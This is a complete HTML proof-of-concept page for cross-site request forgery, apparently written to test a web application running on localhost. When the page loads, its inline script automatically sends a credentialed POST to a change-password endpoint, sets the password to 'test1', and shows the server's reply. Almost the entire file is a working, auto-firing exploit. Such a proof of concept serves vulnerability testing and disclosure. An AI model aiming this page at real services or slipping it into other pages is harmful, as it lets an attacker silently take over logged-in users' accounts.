<!doctype html>
<html lang="ko">
<head>
  <meta charset="utf-8">
  <title>CSRF Change Password PoC</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 40px;
      line-height: 1.5;
    }
    code {
      background: #f2f2f2;
      padding: 2px 4px;
      border-radius: 3px;
    }
    pre {
      background: #111;
      color: #eee;
      padding: 16px;
      white-space: pre-wrap;
    }
  </style>
</head>
<body>
  <h1>CSRF Change Password PoC</h1>
  <p>
    This page sends a password change request to
    <code>http://localhost:8080/api/user/change-password</code>.
  </p>
  <p>Target password: <code>test1</code></p>
  <pre id="result">Sending request...</pre>

  <script>
    var target = window.location.protocol + '//' + window.location.hostname + ':8080/api/user/change-password';

    fetch(target, {
      method: 'POST',
      credentials: 'include',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        password: 'test1'
      })
    })
      .then(async function (response) {
        var text = await response.text();
        document.getElementById('result').textContent =
          'HTTP ' + response.status + '\n\n' + text;
      })
      .catch(function (error) {
        document.getElementById('result').textContent = String(error);
      });
  </script>
</body>
</html>
